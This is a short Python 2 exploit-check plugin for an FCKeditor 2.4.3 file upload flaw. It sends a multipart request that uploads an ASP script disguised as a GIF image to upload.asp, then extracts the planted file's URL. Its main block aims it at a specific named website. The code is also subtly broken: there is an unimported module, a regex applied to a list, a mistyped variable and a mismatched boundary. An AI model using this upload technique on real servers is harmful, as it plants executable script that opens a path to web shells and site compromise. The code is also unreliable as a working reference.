#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re

def assign(service, arg):
    if service == "fckeditor":
        return True, arg

def audit(arg):
    fck2_4_3(arg)

def fck2_4_3(host):
    url_noheader = host[7:]
    path = url_noheader + 'editor/filemanager/upload/asp/upload.asp'
    payload = '-----------------------------20537215486483\r\n'
    payload += 'Content-Disposition: form-data; name="NewFile"; filename="css3.asp"\r\n'
    payload += 'Content-Type: image/jpeg\r\n\r\n'
    payload += 'GIF89a\r\n'
    payload += '<%response.write(999+111)%>\r\n\r\n\r\n'
    payload += '-----------------------------20537215486483--\r\n'
    payload_len = len(payload)
    head = "Content-Type: multipart/form-data; boundary=----20537215486483\r\n"
    head += "Connection: Close\r\n"
    head += "Content-Length: %d" % payload_len + '\r\n\r\n'
    code, head, body, ecode, redirct_url = curl.curl('-H \'%s\' -d \'%s\' %s' % (head, payload, path))
    if code == 200:
        re_shellurl = re.compile('OnUploadCompleted\(.+.asp\)')
        shellurl = re_shellurl.findall(body)
        if shellurl:
            print 1
            ellurl = re.findall('../(\w.+?)"', shellurl)
            if len(ellurl) > 0:
                security_hole('vulnerable: %s' % util.urljoin(host, '../' + shellurl))
    
if __name__ == "__main__":
    from dummy import *
    audit(assign('fckeditor', 'http://www.csljc.com/editor/')[1])